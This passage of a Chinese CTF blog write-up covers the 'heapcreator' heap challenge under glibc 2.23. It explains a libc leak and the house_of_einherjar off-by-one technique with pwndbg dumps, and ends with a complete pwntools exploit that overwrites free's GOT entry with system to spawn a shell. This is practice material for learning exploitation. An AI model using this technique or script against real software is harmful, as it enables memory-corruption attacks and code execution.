+<p>申请一个 0x80 的堆块（实际得到的 0x90）, 然后将其释放。因为这个是一个嵌套的堆块，delete 的时候先释放 content, 再释放 struct</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">4</span>gx <span class="number">0x2368000</span>			<span class="comment">//struct_trr</span></span><br><span class="line"><span class="number">0x2368000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x2368010</span>:	<span class="number">0x0000000000000080</span>	<span class="number">0x0000000002368030</span></span><br><span class="line">pwndbg&gt; x/<span class="number">4</span>gx <span class="number">0x2368020</span>			<span class="comment">//content</span></span><br><span class="line"><span class="number">0x2368020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x2368030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
+<p>free 后</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x2368000</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x2368020</span> —▸ <span class="number">0x7fb1f48beb78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x2368020</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line"></span><br><span class="line">##########################################################<span class="meta">#    </span></span><br><span class="line"><span class="meta">pwndbg&gt; x/4gx 0x2368020</span></span><br><span class="line"><span class="number">0x2368020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x2368030</span>:	<span class="number">0x00007fb1f48beb78</span>	<span class="number">0x00007fb1f48beb78</span></span><br></pre></td></tr></table></figure>
+<p>重新申请后，只要控制 conten 的长度不会将 bk 指针释放释放，同时字符串可以将 bk 链接起来，就可以再 show 的时候，将 bk 泄露出来</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">2</span>gx <span class="number">0x2368010</span></span><br><span class="line"><span class="number">0x2368010</span>:	<span class="number">0x0000000000000080</span>	<span class="number">0x0000000002368030</span></span><br><span class="line">pwndbg&gt; x/<span class="number">4</span>gx <span class="number">0x0000000002368030</span><span class="number">-0x10</span></span><br><span class="line"><span class="number">0x2368020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x2368030</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x00007fb1f48beb78</span></span><br></pre></td></tr></table></figure>
+<h3 id="关键point"><a class="markdownIt-Anchor" href="#关键point">#</a> 关键 point</h3>
+<p>这个题的关键难点在于适合实现 shell，劫持 malloc_hook 也好，覆盖 got 表也好都需要实现任意地址写，这里我们用到一个 unlink 手法 house_of_einherjar。这项技术使用的前提就是存在溢出，至少 1 字节，来修改一个 allocated_chunk 的 prev_size 和 prev_inuse。</p>
+<blockquote>
+<p>house_of_einherjar======&gt;<br>
+ 而此手法有几个点值得关注，1，我们可以认为的修改一个 allocted_chunk 的 prev_size, 以及 prev_inuse. 我们需要构造一个 fake_chunk (一个方面泄露栈地址，在栈上伪造一个 chunk，这个方法配合修改 eip 使用，但是因为栈的内容会发生变化，就要进一步思考控制具体到哪里。其二可以在 bss 段上伪造 chunk，达到修改全局变量的目的。其三可以控制到 got 表，修改 got 表。其四控制到 malloc_hook,free_hook,reallok_hook, 使用 onegadget)。 prev_size = victim_chunk_size - aimed_address。 同时我们还需要利用 victim 的前一个 allocted chunk A， 申请的大小不要使 16 位对齐，0x10*k+8, 这样就可以在申请到 victim B 后，prev_size 允许被 A 使用，同时可以利用 off_by_one 技术 NULL 溢出修改 B 的 prev_inuse（将其改为 0），这样 unlink 通过 chunk_addr_B - prev_size 定位到 fake_chunk, 因为 bss 以及栈地址通常会比 heap 地址大，所以 prev_size 传入的是一个负数，但是因为 prev_size 是无符号数，发生溢出，就这样虽然我们 free B，向前 unlink，结果其实把后面的 fakechunk 合并到一起，而且新的堆头地址是 fakechunk。注意构造 fake_chunk 时，要保证其可以 pass unlink 的检查</p>
+<p>p-&gt;fd-&gt;bk=p,p-&gt;bk-&gt;fd=p,p-&gt;prev_size = p-&gt;bk-&gt;size，p-&gt;fd-&gt;prev_size = p-&gt;size, 最简单的就是将 fd、bk 指向自己。unlink 时，不会改变被合并的堆块的数据，只会更改新的堆头数据，此时 fakechunk 就是新的 topchunk</p>
+</blockquote>
+<p>我们在对快中伪造一个个 fakechunk，然后修改 victim_chunk, 这里要注意的是，victim_chunk 必须与 topchunk 相邻，才可以实现 fake_top_chunk. 这里细解释下为什么这样做，这样做的目的是，在 unlink 前，我们已经申请出一些堆块，比如存在一个结构体堆块，而这个堆块的地址比 fakechunk 大，那么 unlink 后，这个堆块的数据不变，但是 topchunk 的位置在这个堆块之前，我们就可以再次利用到这个堆块，换言之，我们申请一个很大堆块，那么刚刚所说 结构体会被包含，当我们编辑这个大堆块的内容时，控制长度就可以将其覆盖，而我们有知道结构体里面还有一个 content 的指针，如果我们把这个覆盖这个指针，就实现了任意地址写。</p>
+<p>这里要解决几个问题，每次创建的时候会申请出来两个堆块，一个大小 0x20, 一个为 size。为了溢出，我们就要考虑堆块的布局，这里我提供一种</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&quot;\x00&quot;</span>)		<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)		<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;aaaa&#x27;</span>)		<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">&#x27;ssss&#x27;</span>)		<span class="comment">#3</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+<p>0 用来 leak libc_base, 我们重复利用，1 我们构造了两个大小相等的堆块</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x21</span>:struct0---&gt; struct1 ---&gt;content1 ---&gt;struct2 ---&gt;struct3 ---&gt;<span class="number">0</span></span><br><span class="line"><span class="number">0x61</span>:conten2 ---&gt;<span class="number">0</span></span><br><span class="line"></span><br><span class="line">unsortedbins: content0 ---&gt;content3 ---&gt;main_arena			<span class="comment">//(FIFO)</span></span><br><span class="line">    </span><br><span class="line"> fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x2368000</span> —▸ <span class="number">0x23680b0</span> —▸ <span class="number">0x23680d0</span> —▸ <span class="number">0x23680f0</span> —▸ <span class="number">0x2368170</span> ◂— ...</span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x2368110</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x2368020</span> —▸ <span class="number">0x7fb1f48beb78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x2368020</span></span><br></pre></td></tr></table></figure>
+<p>在重新申请堆块的过程中我们还要完成堆地址的泄露，这里其实有两个选择，一种是将 struct 申请作为 content，因为 free 的时候，struct.ptr 没有被清空，可以被泄露。另外一种就是不考虑时那种堆块，只要不是 fastbin 的最后一个，申请出来时，fd 指针没有被清空，此时我们输入的 content 只要时其最低字节就可以（heap 的地址最低三字节一定是 0x000，通过计算 可以得到对低字节）。content3 与 topchunk 相邻，释放后会与其合并，我们不需要考虑，因为 unsortedbin 里只有 0x90 的 content0，只要申请的堆块比他大，就会从 topchunk 获取，因为 0x21 大小的堆块在 fastbin 里面有好几个，就可以是的从 topchunk 连续获得两个较大的堆块，这样 edit 前面堆块就可以完成溢出，fake chunk 的构造需要一定的空间，所以我们使用了 0x50 的堆块。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">fakechunk:<span class="number">0x2368120</span></span><br><span class="line">pwndbg&gt; x/<span class="number">12</span>gx <span class="number">0x0000000002368120</span><span class="number">-0x10</span></span><br><span class="line"><span class="number">0x2368110</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000061</span></span><br><span class="line"><span class="number">0x2368120</span>:	<span class="number">0x0000000000000100</span>	<span class="number">0x0000000000000110</span><span class="comment">//fakesize = victim_prev_size</span></span><br><span class="line"><span class="number">0x2368130</span>:	<span class="number">0x0000000002368120</span>	<span class="number">0x0000000002368120</span><span class="comment">//为了方便绕过检查，fd,bk直接指向fakechunk</span></span><br><span class="line"><span class="number">0x2368140</span>:	<span class="number">0x0000000002368120</span>	<span class="number">0x0000000002368120</span></span><br><span class="line"><span class="number">0x2368150</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x2368160</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"> fake_size = fake_prev_size = victimchunk-fakechunk</span><br><span class="line"> pwndbg&gt; x/<span class="number">18</span>gx <span class="number">0x00000000023681a0</span><span class="number">-0x10</span>		<span class="comment">//victimchunk</span></span><br><span class="line"><span class="number">0x2368190</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00000000000000a1</span></span><br><span class="line"><span class="number">0x23681a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x23681b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x23681c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x23681d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x23681e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x23681f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x2368200</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x2368210</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">24</span>gx <span class="number">0x00000000023681a0</span><span class="number">-0x10</span>		<span class="comment">//edit时覆盖victimchunk</span></span><br><span class="line"><span class="number">0x2368190</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00000000000000a1</span></span><br><span class="line"><span class="number">0x23681a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x23681b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x23681c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x23681d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x23681e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x23681f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x2368200</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x2368210</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x2368220</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x2368230</span>:	<span class="number">0x0000000000000110</span>	<span class="number">0x0000000000000130</span></span><br><span class="line"><span class="number">0x2368240</span>:	<span class="number">0x0000000000006262</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这里就完成了布局，现在只要 free victim_chunk</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/8gx 0x0000000002368120-0x10</span><br><span class="line">0x2368110:	0x0000000000000000	0x0000000000000061</span><br><span class="line">0x2368120:	0x0000000000000100	0x0000000000020ee1</span><br><span class="line">0x2368130:	0x0000000002368120	0x0000000002368120</span><br><span class="line">0x2368140:	0x0000000002368120	0x0000000002368120</span><br><span class="line">//此时fakechunk的size变了，其实这就是fakesize+victim_size+topchunk_size</span><br></pre></td></tr></table></figure>
+<p>这个时候我们在申请一个堆块，并填充一些东西（偏移量在调试中查看）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pad = <span class="string">b&quot;/bin/sh\x00&quot;</span>+ <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x180</span>-<span class="number">0x130</span>-<span class="number">16</span>) +p64(<span class="number">0x21</span>)+p64(<span class="number">50</span>) +p64(free_got)</span><br><span class="line">add(<span class="number">0x200</span>,pad)</span><br></pre></td></tr></table></figure>
+<p>新申请的堆块就是从 fakechunk 开始分配，后面自行调试偏移量</p>
+<h2 id="exp"><a class="markdownIt-Anchor" href="#exp">#</a> EXP</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">r=process(<span class="string">&#x27;./heapcreator&#x27;</span>)</span><br><span class="line">elf =ELF(<span class="string">&quot;./heapcreator&quot;</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">Gptr = <span class="number">0x006020A0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ch</span>(<span class="params">i</span>):</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,text</span>):</span><br><span class="line">	ch(<span class="number">1</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	r.sendafter(<span class="string">&quot;Content of heap:&quot;</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,text</span>):</span><br><span class="line">	ch(<span class="number">2</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	r.sendafter(<span class="string">&quot;Content of heap : &quot;</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">	ch(<span class="number">3</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(idx))	</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">	ch(<span class="number">4</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(idx))	</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r,&#x27;b malloc&#x27;)</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">&#x27;ssss&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">main_arena = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena))</span><br><span class="line">offset = <span class="number">0x7f3d1c53cb78</span>-<span class="number">0x7f3d1c178000</span></span><br><span class="line"><span class="comment">#aimed_addr   </span></span><br><span class="line">malloc_hook=main_arena - <span class="number">0x68</span></span><br><span class="line">lib_base = main_arena-offset</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(lib_base))</span><br><span class="line">system_addr= libc.symbols[<span class="string">&#x27;system&#x27;</span>]+lib_base</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system : &quot;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">&quot;aa&quot;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;\xf0&#x27;</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Content : &quot;</span>)</span><br><span class="line">heap_addr = u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0xf0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x120</span>,<span class="string">&quot;bb&quot;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span> * ( <span class="number">0x90</span>)+p64(<span class="number">0x110</span>)+p64(<span class="number">0x30</span>))</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0x100</span>)+p64(<span class="number">0x110</span>)+p64(heap_addr+<span class="number">0x120</span>)*<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">pad = <span class="string">b&quot;/bin/sh\x00&quot;</span>+ <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x180</span>-<span class="number">0x130</span>-<span class="number">16</span>) +p64(<span class="number">0x21</span>)+p64(<span class="number">50</span>) +p64(free_got)</span><br><span class="line">add(<span class="number">0x200</span>,pad)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,p64(system_addr))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+      <div class="tags">
+          <a href="/tags/writeup/" rel="tag"><i class="ic i-tag"></i> writeup</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">Edited on</span>
+    <time title="Modified: 2022-03-21 09:01:45" itemprop="dateModified" datetime="2022-03-21T09:01:45+08:00">2022-03-21</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> Donate</button>
+  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="dreamcat WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="dreamcat Alipay">
+        <p>Alipay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="dreamcat PayPal">
+        <p>PayPal</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>Post author:  </strong>dreamcat <i class="ic i-at"><em>@</em></i>我他喵的
+  </li>
+  <li class="link">
+    <strong>Post link: </strong>
+    <a href="http://example.com/2022/03/20/buuoj-heapcreator/" title="buuoj_heapcreator">http://example.com/2022/03/20/buuoj-heapcreator/</a>
+  </li>
+  <li class="license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2022/03/19/pwnable-seethefile/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gicitspjpbj20zk0m81ky.jpg" title="pwnable_seethefile">
+  <span class="type">Previous Post</span>
+  <span class="category"><i class="ic i-flag"></i> pwn</span>
+  <h3>pwnable_seethefile</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/2022/03/21/roarctf-2019-easypwn/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giph4baakhj20zk0m8h5q.jpg" title="roarctf_2019_easypwn">
+  <span class="type">Next Post</span>
+  <span class="category"><i class="ic i-flag"></i> pwn</span>
+  <h3>roarctf_2019_easypwn</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="Contents">
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%99%E6%AC%A1%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E5%BC%80%E5%A7%8B%E7%9D%80%E9%87%8D%E6%95%B4%E7%90%86%E4%B8%8B%E5%9C%A8glibc-223%E4%B8%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF"><span class="toc-number">1.</span> <span class="toc-text"> 这次刷题记录开始着重整理下在 Glibc-2.23 下的一些利用姿势</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%85%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text"> 浅析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#main"><span class="toc-number">2.1.</span> <span class="toc-text"> main</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#menu"><span class="toc-number">2.2.</span> <span class="toc-text"> MENU</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#creat"><span class="toc-number">2.3.</span> <span class="toc-text"> Creat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#edit"><span class="toc-number">2.4.</span> <span class="toc-text"> Edit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#show"><span class="toc-number">2.5.</span> <span class="toc-text"> Show</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#free"><span class="toc-number">2.6.</span> <span class="toc-text"> Free</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwning"><span class="toc-number">3.</span> <span class="toc-text"> pwning</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E5%89%8D%E7%9A%84%E5%87%86%E5%A4%87"><span class="toc-number">3.1.</span> <span class="toc-text"> 开始前的准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#leak-the-libc_base"><span class="toc-number">3.2.</span> <span class="toc-text"> leak the libc_base</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AEpoint"><span class="toc-number">3.3.</span> <span class="toc-text"> 关键 point</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">4.</span> <span class="toc-text"> EXP</span></a></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="Related">
+        <ul>
